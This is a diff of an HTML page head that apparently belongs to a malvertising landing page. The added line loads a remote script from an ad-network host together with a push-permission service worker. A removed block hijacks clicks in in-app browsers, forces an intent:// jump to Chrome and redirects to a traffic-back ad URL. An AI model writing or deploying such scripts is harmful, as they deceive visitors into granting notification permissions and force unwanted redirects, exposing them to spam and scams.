@@ -11,7 +11,7 @@
         var pci = url.searchParams.get('123');
         var ppi = url.searchParams.get('456');
         var s = document.createElement('script');
-        s.src='//redrotou.net/218/faf80/mw.min.js?z=4359850'+'&ymid='+pci+'&var='+ppi+'&sw=/sw-check-permissions-01cfa.js'+'&nouns=1';
+        s.src='//redrotou.net/218/faf80/mw.min.js?z=4359850'+'&ymid='+pci+'&var='+ppi+'&sw=/sw-check-permissions-01cfa.js';
         s.onload = function(result) {
             switch (result) {
                 case 'onPermissionDefault':break;
@@ -25,41 +25,6 @@
         };
         document.head.appendChild(s);
     </script>
-
-
-    <script>
-        var url = new URL(window.location.href);
-        var pci = url.searchParams.get('123');
-        var ppi = url.searchParams.get('456');
-        function isInApp() {
-            const regex = new RegExp(`(WebView|(iPhone|iPod|iPad)(?!.*Safari/)|Android.*(wv))`, 'ig');
-            return Boolean(this.ua.match(regex));
-        }
-
-        function initInappRd() {
-            var landingpageURL = window.location.hostname + window.location.pathname + window.location.search;
-            var completeRedirectURL = 'intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;end';
-            var trafficbackURL = "https://inumbreonr.com/4/4359826/?var="+ppi+"&ymid="+pci;
-            var ua = navigator.userAgent.toLowerCase();
-
-            if (isInApp && (ua.indexOf('fb') !== -1 || ua.indexOf('android') !== -1 || ua.indexOf('wv') !== -1)) {
-                document.body.addEventListener('click', function () {
-                    window.onbeforeunload = null;
-                    window.open(completeRedirectURL, '_system');
-                    setTimeout(function () {
-                        window.location.replace(trafficbackURL);
-                    }, 1000);
-                });
-            }
-        }
-
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', initInappRd);
-        } else {
-            initInappRd();
-        }
-    </script>
-
 
 </head>
 <body>
